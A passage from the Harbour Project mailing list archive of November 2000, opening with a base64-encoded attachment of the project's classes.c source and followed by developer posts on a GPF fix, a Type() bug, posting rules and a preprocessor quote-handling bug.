Zm9yKCBpID0gMDsgc3pQYXJlbnROYW1lWyBpIF0gIT0gJ1wwJzsgaSsrICkNCiAgICAgIHN6
UGFyZW50TmFtZVsgaSBdID0gKCBjaGFyICkgdG91cHBlciggc3pQYXJlbnROYW1lWyBpIF0g
KTsNCg0KICAgaGJfcmV0bCggaGJfY2xzSXNQYXJlbnQoIHBDbGFzcywgc3pQYXJlbnROYW1l
ICkgKTsNCg0KICAgaGJfaXRlbUZyZWVDKCBzelBhcmVudE5hbWUgKTsNCn0NCg0KDQovKg0K
ICogPGNDbGFzc05hbWU+IDo9IDxvYmo+OkNsYXNzTmFtZSgpDQogKg0KICogUmV0dXJuIGNs
YXNzIG5hbWUgb2YgPG9iaj4uIENhbiBhbHNvIGJlIHVzZWQgZm9yIGFsbCB0eXBlcy4NCiAq
Lw0Kc3RhdGljIEhBUkJPVVIgaGJfX19tc2dDbHNOYW1lKCB2b2lkICkNCnsNCiAgIFBIQl9J
VEVNIHBJdGVtUmVmOw0KDQogICBpZiggSEJfSVNfQllSRUYoIGhiX3N0YWNrLnBCYXNlICsg
MSApICkgICAgICAgICAgICAvKiBWYXJpYWJsZXMgYnkgcmVmZXJlbmNlICAgKi8NCiAgICAg
IHBJdGVtUmVmID0gaGJfaXRlbVVuUmVmKCBoYl9zdGFjay5wQmFzZSArIDEgKTsNCiAgIGVs
c2UNCiAgICAgIHBJdGVtUmVmID0gaGJfc3RhY2sucEJhc2UgKyAxOw0KDQogICBoYl9yZXRj
KCBoYl9vYmpHZXRDbHNOYW1lKCBwSXRlbVJlZiApICk7DQp9DQoNCg0KLyoNCiAqIDxhTWVz
c2FnZXM+IDo9IDxvYmo+OkNsYXNzU2VsKCkNCiAqDQogKiBSZXR1cm5zIGFsbCB0aGUgbWVz
c2FnZXMgaW4gPG9iaj4NCiAqLw0Kc3RhdGljIEhBUkJPVVIgaGJfX19tc2dDbHNTZWwoIHZv
aWQgKQ0Kew0KICAgVVNIT1JUIHVpQ2xhc3MgPSAoIFVTSE9SVCApICggSEJfSVNfQVJSQVko
IGhiX3N0YWNrLnBCYXNlICsgMSApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICA/ICggaGJfc3RhY2sucEJhc2UgKyAxICktPml0ZW0uYXNBcnJheS52YWx1ZS0+dWlDbGFz
cyA6IDAgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIC8qIEdldCBjbGFzcyB3b3JkICAgICAgICAgICAqLw0KICAgUEhCX0lURU0gcFJldHVy
biA9IGhiX2l0ZW1OZXcoIE5VTEwgKTsNCg0KICAgaWYoICggISB1aUNsYXNzICkgJiYgSEJf
SVNfQllSRUYoIGhiX3N0YWNrLnBCYXNlICsgMSApICkNCiAgIHsgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIFZhcmlhYmxlcyBieSByZWZlcmVuY2Ug
ICAqLw0KICAgICAgUEhCX0lURU0gcEl0ZW1SZWYgPSBoYl9pdGVtVW5SZWYoIGhiX3N0YWNr
LnBCYXNlICsgMSApOw0KICAgICAgaWYoIEhCX0lTX0FSUkFZKCBwSXRlbVJlZiApICkNCiAg
ICAgICAgIHVpQ2xhc3MgPSBwSXRlbVJlZi0+aXRlbS5hc0FycmF5LnZhbHVlLT51aUNsYXNz
Ow0KICAgfQ0KDQogICBpZiggdWlDbGFzcyAmJiB1aUNsYXNzIDw9IHNfdWlDbGFzc2VzICkN
CiAgIHsNCiAgICAgIFBDTEFTUyBwQ2xhc3MgPSBzX3BDbGFzc2VzICsgKCB1aUNsYXNzIC0g
MSApOw0KICAgICAgVVNIT1JUIHVpTGltaXQgPSAoIFVTSE9SVCApICggcENsYXNzLT51aUhh
c2hLZXkgKiBCVUNLRVQgKTsgLyogTnVtYmVyIG9mIEhhc2gga2V5cyAgICAgICovDQogICAg
ICBVU0hPUlQgdWlQb3MgPSAwOw0KICAgICAgVVNIT1JUIHVpQXQ7DQoNCiAgICAgIGhiX2l0
ZW1SZWxlYXNlKCBwUmV0dXJuICk7DQogICAgICBwUmV0dXJuID0gaGJfaXRlbUFycmF5TmV3
KCBwQ2xhc3MtPnVpTWV0aG9kcyApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgLyogQ3JlYXRlIGEgdHJhbnNmZXIgYXJyYXkgICovDQogICAg
ICBmb3IoIHVpQXQgPSAwOyB1aUF0IDwgdWlMaW1pdDsgdWlBdCsrICkNCiAgICAgIHsNCiAg
ICAgICAgIFBIQl9EWU5TIHBNZXNzYWdlID0gKCBQSEJfRFlOUyApIHBDbGFzcy0+cE1ldGhv
ZHNbIHVpQXQgXS5wTWVzc2FnZTsNCg0KICAgICAgICAgaWYoIHBNZXNzYWdlICkgICAgICAg
ICAgICAgICAgICAgICAgICAgLyogSGFzaCBFbnRyeSB1c2VkID8gICAgICAgICovDQogICAg
ICAgICB7DQogICAgICAgICAgICBQSEJfSVRFTSBwSXRlbSA9IGhiX2l0ZW1QdXRDKCBOVUxM
LCBwTWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lICk7DQogICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAvKiBBZGQgdG8gYXJyYXkgICAgICAgICAgICAg
Ki8NCiAgICAgICAgICAgIGhiX2l0ZW1BcnJheVB1dCggcFJldHVybiwgKyt1aVBvcywgcEl0
ZW0gKTsNCiAgICAgICAgICAgIGhiX2l0ZW1SZWxlYXNlKCBwSXRlbSApOw0KICAgICAgICAg
fQ0KICAgICAgfQ0KICAgfQ0KDQogICBoYl9pdGVtUmVsZWFzZSggaGJfaXRlbVJldHVybigg
cFJldHVybiApICk7DQp9DQoNCg0KLyoNCiAqIF9fbXNnRXZhbElubGluZSgpDQogKg0KICog
SW50ZXJuYWwgZnVuY3Rpb24gZXhlY3V0ZWQgZm9yIGlubGluZSBtZXRob2RzDQogKi8NCnN0
YXRpYyBIQVJCT1VSIGhiX19fbXNnRXZhbElubGluZSggdm9pZCApDQp7DQogICBIQl9JVEVN
IGJsb2NrOw0KICAgVVNIT1JUIHVpQ2xhc3MgPSAoIGhiX3N0YWNrLnBCYXNlICsgMSApLT5p
dGVtLmFzQXJyYXkudmFsdWUtPnVpQ2xhc3M7DQogICBVU0hPUlQgdWlQYXJhbTsNCg0KICAg
aGJfYXJyYXlHZXQoIHNfcENsYXNzZXNbIHVpQ2xhc3MgLSAxIF0ucElubGluZXMsIHNfcE1l
dGhvZC0+dWlEYXRhLCAmYmxvY2sgKTsNCg0KICAgaGJfdm1QdXNoU3ltYm9sKCAmaGJfc3lt
RXZhbCApOw0KICAgaGJfdm1QdXNoKCAmYmxvY2sgKTsNCiAgIGhiX3ZtUHVzaCggaGJfc3Rh
Y2sucEJhc2UgKyAxICk7ICAgICAgICAgICAgICAgICAgICAgLyogUHVzaCBzZWxmICAgICAg
ICAgICAgICAgICovDQogICBmb3IoIHVpUGFyYW0gPSAxOyB1aVBhcmFtIDw9IGhiX3Bjb3Vu
dCgpOyB1aVBhcmFtKysgKQ0KICAgICAgaGJfdm1QdXNoKCBoYl9wYXJhbSggdWlQYXJhbSwg
SEJfSVRfQU5ZICkgKTsNCiAgIGhiX3ZtRG8oICggVVNIT1JUICkgKGhiX3Bjb3VudCgpICsg
MSApICk7ICAgICAvKiBTZWxmIGlzIGFsc28gYW4gYXJndW1lbnQgKi8NCg0KICAgaGJfaXRl
bUNsZWFyKCAmYmxvY2sgKTsgICAgICAgICAgICAgICAgICAgICAgIC8qIFJlbGVhc2UgYmxv
Y2sgICAgICAgICAgICAqLw0KfQ0KDQoNCi8qDQogKiBfX21zZ0V2YWwoKQ0KICoNCiAqIElu
dGVybmFsIGZ1bmN0aW9uIGZvciB0aGUgaW50ZXJuYWwgRVZBTCBtZXRob2QuDQogKi8NCnN0
YXRpYyBIQVJCT1VSIGhiX19fbXNnRXZhbCggdm9pZCApDQp7DQogICBpZiggSEJfSVNfQkxP
Q0soIGhiX3N0YWNrLnBCYXNlICsgMSApICkNCiAgIHsNCiAgICAgIFVTSE9SVCB1aVBhcmFt
Ow0KDQogICAgICBoYl92bVB1c2hTeW1ib2woICZoYl9zeW1FdmFsICk7DQogICAgICBoYl92
bVB1c2goIGhiX3N0YWNrLnBCYXNlICsgMSApOyAgICAgICAgICAgICAgICAgICAgIC8qIFB1
c2ggYmxvY2sgICAgICAgICAgICAgICAqLw0KICAgICAgZm9yKCB1aVBhcmFtID0gMTsgdWlQ
YXJhbSA8PSBoYl9wY291bnQoKTsgdWlQYXJhbSsrICkNCiAgICAgICAgIGhiX3ZtUHVzaCgg
aGJfcGFyYW0oIHVpUGFyYW0sIEhCX0lUX0FOWSApICk7DQogICAgICBoYl92bURvKCAoIFVT
SE9SVCApIGhiX3Bjb3VudCgpICk7ICAgICAgICAgICAgICAgICAgICAgICAvKiBTZWxmIGlz
IGFsc28gYW4gYXJndW1lbnQgKi8NCiAgIH0NCiAgIGVsc2UNCiAgICAgIGhiX2VyclJUX0JB
U0VfU3Vic3RSKCBFR19OT01FVEhPRCwgMTAwNCwgTlVMTCwgIkVWQUwiICk7DQp9DQoNCi8q
DQogKiBfX21zZ1N1cGVyKCkNCiAqDQogKiBJbnRlcm5hbCBmdW5jdGlvbiB0byByZXR1cm4g
YSBzdXBlcm9iamVjdA0KICovDQpzdGF0aWMgSEFSQk9VUiBoYl9fX21zZ1N1cGVyKCB2b2lk
ICkNCnsNCiAgIFBIQl9JVEVNIHBPYmplY3QgPSBoYl9zdGFjay5wQmFzZSArIDE7DQovKiBV
U0hPUlQgdWlJbmRleCA9IHNfcE1ldGhvZC0+dWlEYXRhOyAqLw0KDQogICBwT2JqZWN0LT5p
dGVtLmFzQXJyYXkudmFsdWUtPnVpUHJldkNscyA9IHBPYmplY3QtPml0ZW0uYXNBcnJheS52
YWx1ZS0+dWlDbGFzczsgLyogYmFja3VwIG9mIGFjdHVhbCBoYW5kZWwgKi8NCiAgIHBPYmpl
Y3QtPml0ZW0uYXNBcnJheS52YWx1ZS0+dWlDbGFzcyAgID0gc19wTWV0aG9kLT51aVNwckNs
YXNzOyAvKiBzdXBlcmNsYXNzIGhhbmRlbCBjYXN0aW5nICovDQoNCiAgIGhiX2l0ZW1SZXR1
cm4oIHBPYmplY3QgKTsNCg0KLyogVGhpcyBvbmUgd291bGQgcmV0dXJuIGEgcmVhbCBzdXBl
ck9iamVjdCBidXQgd2l0aCB0aGUgc2lkZSBlZmZlY3QgdG8gICovDQovKiBhbHNvIHNldCBh
IGJhZCBTZWxmIHBvaW50ZXIgZm9yIHRoZSBzdXBlcm1lc3NhZ2VzICAgICAgICAgICAgICAg
ICAgICAgKi8NCi8qIFBsZWFzZSBkb24ndCBlcmFzZSB0aG9zZSBsaW5lcyB1bnRpbCBJIGRv
IGl0IG15c2VsZiAoSkYpICAgICAgICAgICAgICAqLw0KLyogSSBoYXZlIHlldCB0byB0aGlu
ayBhYm91dCBhIGJldHRlciBzb2x1dGlvbiB3aGVyZSBJIGNvdWxkIHJldHVybiBhICAgICov
DQovKiByZWFsIE9iamVjdCBhcyBrZWVwaW5nIHRoZSBnb29kIFNlbGYgdmFsdWUgd2l0aGlu
IGFsbCB0aGUgY2xhc3MgdHJlZSAgKi8NCi8qICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLw0KLyogICAg
aGJfaXRlbVJldHVybiggaGJfYXJyYXlHZXRJdGVtUHRyKCBwT2JqZWN0LCBzX3BNZXRob2Qt
PnVpRGF0YSApICk7ICovDQovKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKi8NCn0NCg0KLyoNCiAqIF9f
bXNnQ2xhc3MoKQ0KICoNCiAqIEludGVybmFsIGZ1bmN0aW9uIHRvIHJldHVybiBTZWxmIGF0
IFNlbGY6Q2xhc3MgY2FsbCAoY2xhc3N5IGNvbXBhdGliaWxpdHkpDQogKi8NCi8qDQpzdGF0
aWMgSEFSQk9VUiBoYl9fX21zZ0NsYXNzKCB2b2lkICkNCnsNCiAgIGhiX2l0ZW1SZXR1cm4o
IGhiX3N0YWNrLnBCYXNlICsgMSApOw0KfQ0KKi8NCg0KLyoNCiAqIF9fbXNnR2V0Q2xzRGF0
YSgpDQogKg0KICogSW50ZXJuYWwgZnVuY3Rpb24gdG8gcmV0dXJuIGEgQ0xBU1NEQVRBDQog
Ki8NCnN0YXRpYyBIQVJCT1VSIGhiX19fbXNnR2V0Q2xzRGF0YSggdm9pZCApDQp7DQogICBV
U0hPUlQgdWlDbGFzcyA9ICggaGJfc3RhY2sucEJhc2UgKyAxICktPml0ZW0uYXNBcnJheS52
YWx1ZS0+dWlDbGFzczsNCg0KICAgaWYoIHVpQ2xhc3MgJiYgdWlDbGFzcyA8PSBzX3VpQ2xh
c3NlcyApDQogICAgICBoYl9hcnJheUdldCggc19wQ2xhc3Nlc1sgdWlDbGFzcyAtIDEgXS5w
Q2xhc3NEYXRhcywgc19wTWV0aG9kLT51aURhdGEsICZoYl9zdGFjay5SZXR1cm4gKTsNCn0N
Cg0KDQovKg0KICogX19tc2dTZXRDbHNEYXRhKCkNCiAqDQogKiBJbnRlcm5hbCBmdW5jdGlv
biB0byBzZXQgYSBDTEFTU0RBVEENCiAqLw0Kc3RhdGljIEhBUkJPVVIgaGJfX19tc2dTZXRD
bHNEYXRhKCB2b2lkICkNCnsNCiAgIFVTSE9SVCB1aUNsYXNzID0gKCBoYl9zdGFjay5wQmFz
ZSArIDEgKS0+aXRlbS5hc0FycmF5LnZhbHVlLT51aUNsYXNzOw0KDQogICBQSEJfSVRFTSBw
UmV0dXJuID0gaGJfc3RhY2sucEJhc2UgKyAyOw0KDQogICBpZiggdWlDbGFzcyAmJiB1aUNs
YXNzIDw9IHNfdWlDbGFzc2VzICkNCiAgICAgIGhiX2FycmF5U2V0KCBzX3BDbGFzc2VzWyB1
aUNsYXNzIC0gMSBdLnBDbGFzc0RhdGFzLA0KICAgICAgICAgICAgICAgICAgIHNfcE1ldGhv
ZC0+dWlEYXRhLCBwUmV0dXJuICk7DQoNCiAgIGhiX2l0ZW1SZXR1cm4oIHBSZXR1cm4gKTsN
Cn0NCg0KLyoNCiAqIF9fbXNnR2V0U2hyRGF0YSgpDQogKg0KICogSW50ZXJuYWwgZnVuY3Rp
b24gdG8gcmV0dXJuIGEgU0hBUkVEREFUQQ0KICovDQpzdGF0aWMgSEFSQk9VUiBoYl9fX21z
Z0dldFNockRhdGEoIHZvaWQgKQ0Kew0KICAgVVNIT1JUIHVpU3ByQ2xzID0gc19wTWV0aG9k
LT51aVNwckNsYXNzOw0KDQogICBpZiggdWlTcHJDbHMgJiYgdWlTcHJDbHMgPD0gc191aUNs
YXNzZXMgKQ0KICAgICAgaGJfYXJyYXlHZXQoIHNfcENsYXNzZXNbIHVpU3ByQ2xzIC0gMSBd
LnBDbGFzc0RhdGFzLCBzX3BNZXRob2QtPnVpRGF0YVNoYXJlZCwgJmhiX3N0YWNrLlJldHVy
biApOw0KfQ0KDQovKg0KICogX19tc2dTZXRTaHJEYXRhKCkNCiAqDQogKiBJbnRlcm5hbCBm
dW5jdGlvbiB0byBzZXQgYSBTSEFSRUREQVRBDQogKi8NCnN0YXRpYyBIQVJCT1VSIGhiX19f
bXNnU2V0U2hyRGF0YSggdm9pZCApDQp7DQogICBVU0hPUlQgdWlTcHJDbHMgPSBzX3BNZXRo
b2QtPnVpU3ByQ2xhc3M7DQoNCiAgIFBIQl9JVEVNIHBSZXR1cm4gPSBoYl9zdGFjay5wQmFz
ZSArIDI7DQoNCiAgIGlmKCB1aVNwckNscyAmJiB1aVNwckNscyA8PSBzX3VpQ2xhc3NlcyAp
DQogICAgICBoYl9hcnJheVNldCggc19wQ2xhc3Nlc1sgdWlTcHJDbHMgLSAxIF0ucENsYXNz
RGF0YXMsDQogICAgICAgICAgICAgICAgICAgc19wTWV0aG9kLT51aURhdGFTaGFyZWQsIHBS
ZXR1cm4gKTsNCg0KICAgaGJfaXRlbVJldHVybiggcFJldHVybiApOw0KfQ0KDQovKg0KICog
X19tc2dHZXREYXRhKCkNCiAqDQogKiBJbnRlcm5hbCBmdW5jdGlvbiB0byByZXR1cm4gYSBE
QVRBDQogKi8NCnN0YXRpYyBIQVJCT1VSIGhiX19fbXNnR2V0RGF0YSggdm9pZCApDQp7DQog
ICBQSEJfSVRFTSBwT2JqZWN0ID0gaGJfc3RhY2sucEJhc2UgKyAxOw0KICAgVVNIT1JUIHVp
SW5kZXggPSBzX3BNZXRob2QtPnVpRGF0YTsNCg0KICAgLyogd2lsbCBhcmlzZSBvbmx5IGlm
IHRoZSBjbGFzcyBoYXMgYmVlbiBtb2RpZmllZCBhZnRlciBmaXJzdCBpbnN0YW5jZSAqLw0K
ICAgaWYoIHVpSW5kZXggPiAoIFVTSE9SVCApIGhiX2FycmF5TGVuKCBwT2JqZWN0ICkgKSAv
KiBSZXNpemUgbmVlZGVkICovDQogICAgICBoYl9hcnJheVNpemUoIHBPYmplY3QsIHVpSW5k
ZXggKTsgLyogTWFrZSBsYXJnZSBlbm91Z2ggKi8NCg0KICAgaGJfYXJyYXlHZXQoIHBPYmpl
Y3QsIHVpSW5kZXgsICZoYl9zdGFjay5SZXR1cm4gKTsNCn0NCg0KLyoNCiAqIF9fbXNnU2V0
RGF0YSgpDQogKg0KICogSW50ZXJuYWwgZnVuY3Rpb24gdG8gc2V0IGEgREFUQQ0KICovDQpz
dGF0aWMgSEFSQk9VUiBoYl9fX21zZ1NldERhdGEoIHZvaWQgKQ0Kew0KICAgUEhCX0lURU0g
cE9iamVjdCA9IGhiX3N0YWNrLnBCYXNlICsgMTsNCiAgIFBIQl9JVEVNIHBSZXR1cm4gPSBo
Yl9zdGFjay5wQmFzZSArIDI7DQogICBVU0hPUlQgdWlJbmRleCA9IHNfcE1ldGhvZC0+dWlE
YXRhOw0KDQogICAvKiB3aWxsIGFyaXNlIG9ubHkgaWYgdGhlIGNsYXNzIGhhcyBiZWVuIG1v
ZGlmaWVkIGFmdGVyIGZpcnN0IGluc3RhbmNlICovDQogICBpZiggdWlJbmRleCA+ICggVVNI
T1JUICkgaGJfYXJyYXlMZW4oIHBPYmplY3QgKSApIC8qIFJlc2l6ZSBuZWVkZWQgPyAqLw0K
ICAgICAgaGJfYXJyYXlTaXplKCBwT2JqZWN0LCB1aUluZGV4ICk7IC8qIE1ha2UgbGFyZ2Ug
ZW5vdWdoICovDQoNCiAgIGhiX2FycmF5U2V0KCBwT2JqZWN0LCB1aUluZGV4LCBwUmV0dXJu
ICk7DQoNCiAgIGhiX2l0ZW1SZXR1cm4oIHBSZXR1cm4gKTsNCn0NCg0KLyogTm8gY29tbWVu
dCA6LSkgKi8NCnN0YXRpYyBIQVJCT1VSIGhiX19fbXNnVmlydHVhbCggdm9pZCApDQp7DQog
ICAvKiBoYl9yZXQoKTsgKi8gLyogTk9URTogSXQncyBzYWZlIHRvIGNvbW1lbnQgdGhpcyBv
dXQgKi8NCiAgIDsNCn0NCg0KDQovKiBOT1RFOiBVc2VkIGJ5IHRoZSBwcmVwcm9jZXNzb3Ig
dG8gaW1wbGVtZW50IENsYXNzeSBjb21wYXRpYmlsaXR5IHRvIEhhcmJvdXINCiAgICAgICAg
IFJlY2VpdmUgYW4gdmFyaWFibGUgbnVtYmVyIG9mIHBhcmFtIGFuZCByZXR1cm4gYW4gYXJy
YXkgb2YgaXQuDQogICAgICAgICBObyBwYXJhbSB3aWxsIHJldHVybiBhIE5VTEwgYXJyYXkg
Ki8NCg0KDQpIQl9GVU5DKCBfX0NMU19QQVJBTSApDQp7DQogICBQSEJfSVRFTSBhcnJheTsN
CiAgIFVTSE9SVCB1aVBhcmFtID0gKCBVU0hPUlQgKSBoYl9wY291bnQoKTsNCiAgIFVTSE9S
VCBuOw0KDQogICBpZiggdWlQYXJhbSA+PSAxICkNCiAgIHsNCiAgICAgIGFycmF5ID0gaGJf
aXRlbUFycmF5TmV3KCB1aVBhcmFtICk7DQogICAgICBmb3IoIG4gPSAxOyBuIDw9IHVpUGFy
YW07IG4rKyApDQogICAgICB7DQogICAgICAgICBQSEJfSVRFTSBpVG1wID0gaGJfaXRlbVBh
cmFtKCBuICk7DQogICAgICAgICBoYl9pdGVtQXJyYXlQdXQoIGFycmF5LCBuLCBpVG1wICk7
DQogICAgICAgICBoYl9pdGVtUmVsZWFzZSggaVRtcCApOw0KICAgICAgfQ0KICAgfQ0KICAg
ZWxzZQ0KICAgew0KICAgICAgUEhCX0lURU0gaVRtcCA9IGhiX2l0ZW1QdXRDKCBOVUxMLCAo
Y2hhciAqKSAiVE9iamVjdCIgKTsNCiAgICAgIGFycmF5ID0gaGJfaXRlbUFycmF5TmV3KCAx
ICk7DQogICAgICBoYl9pdGVtQXJyYXlQdXQoIGFycmF5LCAxLCBpVG1wICk7DQogICAgICBo
Yl9pdGVtUmVsZWFzZSggaVRtcCApOw0KICAgfQ0KDQogICBoYl9pdGVtUmVsZWFzZSggaGJf
aXRlbVJldHVybiggYXJyYXkgKSApOw0KfQ0KDQovKiBUaGlzIG9uZSBpcyB1c2VkIHdoZW4g
SEJfTk9UT0JKRUNUIGlzIGRlZmluZWQgYmVmb3JlIEhCQ0xBU1MuQ0ggKi8NCi8qIGl0IHdp
bGwgYXZvaWQgYW55IGRlZmF1bHQgb2JqZWN0IHRvIGJlIGluaGVyaXRlZCAqLw0KSEJfRlVO
QyggX19DTFNfUEFSMDAgKQ0Kew0KICAgUEhCX0lURU0gYXJyYXk7DQogICBVU0hPUlQgdWlQ
YXJhbSA9ICggVVNIT1JUICkgaGJfcGNvdW50KCk7DQogICBVU0hPUlQgbjsNCg0KICAgYXJy
YXkgPSBoYl9pdGVtQXJyYXlOZXcoIHVpUGFyYW0gKTsNCiAgIGZvciggbiA9IDE7IG4gPD0g
dWlQYXJhbTsgbisrICkNCiAgICB7DQogICAgICAgICBQSEJfSVRFTSBpVG1wID0gaGJfaXRl
bVBhcmFtKCBuICk7DQogICAgICAgICBoYl9pdGVtQXJyYXlQdXQoIGFycmF5LCBuLCBpVG1w
ICk7DQogICAgICAgICBoYl9pdGVtUmVsZWFzZSggaVRtcCApOw0KICAgIH0NCg0KICAgaGJf
aXRlbVJlbGVhc2UoIGhiX2l0ZW1SZXR1cm4oIGFycmF5ICkgKTsNCn0NCg0KGg==

--Message-Boundary-1364--

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 16:42:02 2000
Date: Sat Nov  4 16:42:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] dynsym.c caused GPF (Maurilio)

<PRE>Maurilio,

Please read my previous mail. 

I have a problem here with your program (tfarmaq.prg) in the sense 
the method keyboardhook are never called and I don't understand 
why. 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 16:45:03 2000
Date: Sat Nov  4 16:45:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Type() is busted

<PRE>Type() is returning &quot;U&quot; for database fields!

func test
public x
use test
? fieldname(1)          // FIRST
? fieldget(1)           // Homer
? valtype(fieldget(1))  // C
? type(&quot;x&quot;)             // L works ok on publics
? type(&quot;first&quot;)         // U !!! Should be C  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
return


Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 16:59:02 2000
Date: Sat Nov  4 16:59:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Brian ...

<PRE>Hi Brian,

Unfortunatly, I have some problem with your program (humm, not 
your program in fact, but the FWH version installed here) It seem 
the version I have here is to old and so I have some undefined 
external at link time. I don't remember if I received the update by 
mail or if there was an URL from where to download the patch. (I'm 
at home here :-((( and the last version is installed at my office)

Could you do a try with the last classes.c I posted to the list so as 
Maurilio can test it's program ?

See you,
 

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 17:01:02 2000
Date: Sat Nov  4 17:01:02 2000
From: Patrick Mast, Harbour harbour@lists.harbour-project.org
Subject: [Harbour] Ideas about mailing list features.

<PRE>Jose,

&gt;<i> To Patrick,
</I>&gt;<i> these should be added in the Web site as: &quot;Follow this rules when
</I>&gt;<i> posting to the Harbour mailing list&quot;:
</I>&gt;<i> 
</I>&gt;<i> * No HTML post, only plain text
</I>&gt;<i> * No binaries (JPG, BMP) others than ZIP's with source/docs/tests
</I>&gt;<i> * No messages with &quot;the &lt;3rd party lib&gt; doesn't work with Harbour&quot;
</I>&gt;<i> * Warn people about to not include the replied message when not
</I>&gt;<i> necesary.
</I>Not a bad Idea.

regards,

Patrick Mast
www.Patrick.Be.kz


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 17:16:02 2000
Date: Sat Nov  4 17:16:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] more embedded quotes

<PRE>Brian,

Please try again, &quot;''&quot; work correctly here (for both lexers).

Ron

&gt;<i> So I tried this for a temporary fix, and it doesn't work either!  
</I>&gt;<i> This is 2
</I>&gt;<i> single-quotes as a constant (here inside double-quotes)
</I>&gt;<i> 
</I>&gt;<i> cLine = &quot;''&quot;
</I>&gt;<i> 
</I>&gt;<i> Brian Hays
</I>&gt;<i> Abacus Data Systems, Inc
</I>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 17:16:11 2000
Date: Sat Nov  4 17:16:11 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Embedded quotes  error on ['']

<PRE>Brian,

This is a bug that which will only manifest itself with SimpLex _but_
SimpLex is correct, and this is actually a PP bug!!!

Please note the following, in Clipper PP would have converted [''] to &quot;''&quot;
because of complex logic to-do with string delimiters handling. In simple
terms it does the following:

1. If string delimiter is &quot; =&gt; do nothing.
2. If string delimiter is ' =&gt; if string does *not* _contains_ &quot; =&gt; convert
' delimiter to &quot; delimiter.
3. If string delimiter is [ =&gt; if string does *not* _contains_ &quot; =&gt; convert
[ delimiter to &quot; delimiter.
                               else if string does *not* _contains_ ' =&gt;
convert [ delimiter to ' delimiter.

It gets even more complicated when a string may contain all 3 standard
delimiters ('&quot;[]) in such case Clipper will use dual character string
delimiter (not documented).

In summary, in Clipper PPed code you can *never* have the string [''], thus
when this PP bug will be fixed, your above bug will disappear.

Ron

&gt;<i> This code (those are two single quotes):
</I>&gt;<i>          cLine = ['']
</I>&gt;<i> yields cLine with only ONE  '   instead of two ''
</I>&gt;<i>
</I>&gt;<i> The preprocessor does not change the code!
</I>&gt;<i>
</I>&gt;<i> BTW, yes this is real live code. I have a routine that lets users create
</I>&gt;<i> text files that get parsed and macro compiled, so I have to deal
</I>&gt;<i> with quotes
</I>&gt;<i> within quotes within quotes.
</I>&gt;<i>
</I>&gt;<i> Brian Hays
</I>&gt;<i> Abacus Data Systems, Inc
</I>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 17:24:02 2000
Date: Sat Nov  4 17:24:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] more embedded quotes

<PRE>You're right, the error is only in [''].
Sorry for the red herring.

Alexander: Clipper PP translates [''] to &quot;''&quot; (converts the [] to double
quotes).

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;Ron Pinkas&quot; &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Saturday, November 04, 2000 2:16 pm
Subject: RE: [Harbour] more embedded quotes


&gt;<i> Brian,
</I>&gt;<i>
</I>&gt;<i> Please try again, &quot;''&quot; work correctly here (for both lexers).
</I>&gt;<i>
</I>&gt;<i> Ron
</I>&gt;<i>
</I>&gt;<i> &gt; So I tried this for a temporary fix, and it doesn't work either!
</I>&gt;<i> &gt; This is 2
</I>&gt;<i> &gt; single-quotes as a constant (here inside double-quotes)
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; cLine = &quot;''&quot;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Brian Hays
</I>&gt;<i> &gt; Abacus Data Systems, Inc
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 17:56:02 2000
Date: Sat Nov  4 17:56:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Brian ...

<PRE>JF
It works! At least, the initial gpf is gone with just using the new vm.lib.
I'll keep you posted on anything that comes up as we continue testing.
Thanks!

And Maurilio -- great hunting!

Brian Hays

&gt;<i> Could you do a try with the last classes.c I posted to the list so as
</I>&gt;<i> Maurilio can test it's program ?
</I>&gt;<i>
</I>


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 18:07:02 2000
Date: Sat Nov  4 18:07:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
